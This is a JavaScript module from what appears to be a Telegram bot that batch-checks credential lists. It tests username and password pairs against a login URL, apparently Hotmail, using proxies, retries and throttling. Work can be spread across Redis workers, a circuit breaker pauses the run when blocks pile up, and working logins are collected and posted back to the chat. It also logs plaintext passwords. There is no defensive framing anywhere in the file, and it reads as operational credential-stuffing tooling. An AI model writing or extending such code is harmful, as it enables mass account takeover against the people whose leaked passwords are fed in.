/**
 * =============================================================================
 * BATCH EXECUTOR - Core batch processing execution logic
 * =============================================================================
 * 
 * Handles the actual execution of batch credential checking including:
 * - Chunk-based parallel processing
 * - Progress updates
 * - Circuit breaker integration
 * - Result tracking
 * 
 * =============================================================================
 */

const { createLogger } = require('../../logger');
const {
  makeKey,
  markProcessedStatus,
  flushWriteBuffer,
} = require('../../automation/batch/processedStore');
const {
  buildBatchProgress,
  buildBatchSummary,
  buildBatchAborted,
  buildBatchFailed,
  buildBatchAborting,
} = require('../messages');
const { setActiveBatch, clearActiveBatch, deletePendingBatch } = require('./batchState');
const { createCircuitBreaker } = require('./circuitBreaker');

const log = createLogger('batch-executor');

// Batch processing configuration
const BATCH_CONCURRENCY = Math.max(1, parseInt(process.env.BATCH_CONCURRENCY, 10) || 1);
const MAX_RETRIES = parseInt(process.env.BATCH_MAX_RETRIES, 10) || 1;
const REQUEST_DELAY_MS = parseInt(process.env.BATCH_DELAY_MS, 10) || 50;
const PROGRESS_UPDATE_INTERVAL_MS = 2000;
const PROCESSED_TTL_MS = parseInt(process.env.PROCESSED_TTL_MS, 10) || 7 * 24 * 60 * 60 * 1000;

/**
 * Runs the batch execution for a set of credentials.
 * @param {Object} ctx - Telegraf context
 * @param {Object} batch - Batch object with creds, filename, count
 * @param {string} msgId - Source message ID
 * @param {Object} statusMsg - Status message to update
 * @param {Object} options - Check options (timeoutMs, proxy, targetUrl, compatibility)
 * @param {Object} helpers - Helper functions (escapeV2, formatDurationMs)
 * @param {string} key - Batch key for state management
 * @param {Function} checkCredentials - Credential checking function
 */
function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials) {
  const chatId = ctx.chat.id;
  
  // Check if we're in coordinator mode - if so, queue to Redis instead of processing directly
  if (options.compatibility && options.compatibility.isDistributed && options.compatibility.isDistributed()) {
    log.info(`Coordinator mode detected - queuing ${batch.count} tasks to Redis instead of direct processing`);
    return runDistributedBatch(ctx, batch, msgId, statusMsg, options, helpers, key);
  }
  
  // Otherwise, run single-node batch processing
  return runSingleNodeBatch(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials);
}

/**
 * Queue batch to Redis for distributed worker processing
 */
async function runDistributedBatch(ctx, batch, msgId, statusMsg, options, helpers, key) {
  const chatId = ctx.chat.id;
  
  try {
    // Access coordinator from compatibility layer (spread at top level)
    const compatibility = options.compatibility;
    const coordinator = compatibility.coordinator;
    
    if (!coordinator || !coordinator.jobQueue) {
      log.error('Coordinator structure:', Object.keys(compatibility || {}));
      throw new Error('Coordinator not initialized - jobQueue not available');
    }
    
    log.info(`Queuing ${batch.count} credentials to job queue`);
    
    // Generate batch ID
    const { generateBatchId } = require('../../shared/redis/keys');
    const batchId = generateBatchId();
    
    // Queue the batch with correct parameters
    const result = await coordinator.jobQueue.enqueueBatch(
      batchId,
      batch.creds,
      {
        batchType: 'HOTMAIL', // or determine from context
        chatId,
        filename: batch.filename,
        userId: ctx.from.id
      }
    );
    
    // Update message with queued status
    const text = helpers.escapeV2(`✅ Batch queued!\n\n` +
      `📁 File: ${batch.filename}\n` +
      `📊 Total: ${batch.count} credentials\n` +
      `✨ Queued: ${result.queued} new tasks\n` +
      `💾 Cached: ${result.cached} already processed\n` +
      `🆔 Batch ID: ${batchId}\n\n` +
      `Workers will process this batch. Check back soon!`);
    
    await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
      parse_mode: 'MarkdownV2',
    });
    
    log.info(`Batch queued successfully: ${batchId}`);
    
    // Initialize progress tracker with the Telegram message
    await coordinator.progressTracker.initBatch(
      batchId,
      result.queued,
      chatId,
      statusMsg.message_id
    );
    
    // Subscribe to progress updates for this batch
    coordinator.progressTracker.startTracking(batchId, batch.filename);
    
  } catch (error) {
    log.error('Failed to queue batch', { error: error.message });
    
    const errorText = helpers.escapeV2(`❌ Failed to queue batch\n\n` +
      `Error: ${error.message}\n\n` +
      `Please try again or contact support.`);
    
    await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, errorText, {
      parse_mode: 'MarkdownV2',
    });
  }
}

/**
 * Run batch in single-node mode (original behavior)
 */
function runSingleNodeBatch(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials) {
  const chatId = ctx.chat.id;
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();
  let lastProgressAt = startedAt;
  
  // Circuit breaker for error rate monitoring
  const circuitBreaker = createCircuitBreaker();

  // Create promise to track batch completion
  let batchCompleteResolve;
  batch._completionPromise = new Promise(resolve => {
    batchCompleteResolve = resolve;
  });
  
  // Expose processed count for shutdown tracking
  batch.processed = 0;

  // Track active batch for /stop command
  setActiveBatch(chatId, batch, key);

  log.info(`Executing file=${batch.filename} total=${batch.count} concurrency=${BATCH_CONCURRENCY}`);

  // Progress update - blocking to ensure message gets updated
  const updateProgress = async (force = false) => {
    if (batch.aborted) return;
    
    const now = Date.now();
    if (!force && now - lastProgressAt < PROGRESS_UPDATE_INTERVAL_MS) return;
    
    lastProgressAt = now;
    
    const text = buildBatchProgress({
      filename: batch.filename,
      processed,
      total: batch.count,
      counts,
      validCreds,
    });

    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
        parse_mode: 'MarkdownV2',
      });
    } catch (err) {
      if (!err.message?.includes('message is not modified')) {
        log.debug(`Progress update failed: ${err.message}`);
      }
    }
  };

  const processCredential = async (cred) => {
    if (batch.aborted) return;
    
    // Check circuit breaker before processing
    const cbCheck = circuitBreaker.check();
    if (cbCheck.shouldPause) {
      await new Promise(r => setTimeout(r, cbCheck.pauseMs));
      circuitBreaker.reset();
    }
    
    let result;
    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
    
    log.info(`[batch] checking ${cred.username}:${cred.password}`);
    
    // Retry loop for ERROR results
    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
      if (batch.aborted) return;
      
      try {
        result = await checkCredentials(cred.username, cred.password, {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
          batchMode: true,
        });
      } catch (err) {
        result = { status: 'ERROR', message: err.message };
      }
      
      if (result.status !== 'ERROR' || attempt >= MAX_RETRIES) break;
      
      log.debug(`Retry ${cred.username} (${attempt + 2}/${MAX_RETRIES + 1}): ${result.message}`);
      await new Promise(r => setTimeout(r, (500 * Math.pow(2, attempt)) + Math.random() * 300));
    }

    // Track for circuit breaker
    circuitBreaker.recordResult(result.status);

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;
    batch.processed = processed;

    if (result.status === 'VALID') {
      validCreds.push({ username: cred.username, password: cred.password });
    }

    // Non-blocking cache update
    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch(() => {});
    
    return result;
  };

  // Process credentials in chunks
  const processInChunks = async () => {
    const allCreds = batch.creds;
    const chunkSize = BATCH_CONCURRENCY;
    
    for (let i = 0; i < allCreds.length; i += chunkSize) {
      if (batch.aborted) break;
      
      // Check circuit breaker before each chunk
      const cbCheck = circuitBreaker.check();
      if (cbCheck.shouldPause) {
        await new Promise(r => setTimeout(r, cbCheck.pauseMs));
        circuitBreaker.reset();
      }
      
      const chunk = allCreds.slice(i, i + chunkSize);
      const chunkNum = Math.floor(i / chunkSize) + 1;
      const totalChunks = Math.ceil(allCreds.length / chunkSize);
      
      log.debug(`Processing chunk ${chunkNum}/${totalChunks} (${chunk.length} credentials)`);
      
      // Process credentials - sequentially if concurrency is 1
      if (chunkSize === 1) {
        await processCredential(chunk[0]);
      } else {
        await Promise.all(chunk.map(cred => processCredential(cred)));
      }
      
      // Update progress after each chunk
      await updateProgress(true);
      
      // Delay between chunks
      if (i + chunkSize < allCreds.length && REQUEST_DELAY_MS > 0) {
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
      }
    }
  };

  const execute = async () => {
    try {
      await processInChunks();

      const elapsed = Date.now() - startedAt;
      const summary = batch.aborted
        ? buildBatchAborted({ filename: batch.filename, total: batch.count, processed })
        : buildBatchSummary({
            filename: batch.filename,
            total: batch.count,
            skipped: batch.skipped || 0,
            counts,
            elapsedMs: elapsed,
            validCreds,
          });

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        log.warn('Batch summary edit failed:', err.message);
        await ctx.reply(summary, {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      }

      log.info(
        `Finished file=${batch.filename} aborted=${!!batch.aborted} processed=${processed}/${batch.count} ` +
        `valid=${counts.VALID} invalid=${counts.INVALID} blocked=${counts.BLOCKED} error=${counts.ERROR} elapsed_ms=${elapsed}`
      );
    } catch (err) {
      try {
        await ctx.reply(buildBatchFailed(err.message), {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      } catch (_) {}
      log.warn(`Execution failed file=${batch.filename} msg=${err.message}`);
    } finally {
      // Flush any buffered Redis writes before completing
      await flushWriteBuffer().catch(() => {});
      
      deletePendingBatch(key);
      clearActiveBatch(chatId);
      batchCompleteResolve();
    }
  };

  // Schedule to avoid Telegraf 90s per-update timeout
  setTimeout(execute, 0);
}

module.exports = {
  runBatchExecution,
  BATCH_CONCURRENCY,
  MAX_RETRIES,
  REQUEST_DELAY_MS,
  PROGRESS_UPDATE_INTERVAL_MS,
};

